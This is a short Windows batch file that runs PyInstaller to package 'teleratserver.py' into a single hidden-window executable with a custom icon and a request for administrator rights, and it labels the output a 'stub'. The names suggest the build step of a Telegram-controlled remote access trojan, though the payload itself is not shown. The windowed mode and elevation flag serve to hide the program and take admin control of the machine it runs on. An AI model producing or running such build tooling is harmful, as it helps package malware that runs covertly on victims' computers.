@echo off
title building stub...
pyinstaller -i "stub.ico" --noconfirm --uac-admin --windowed --onefile "teleratserver.py"
title building complete
echo Press any key to close this window
pause >nul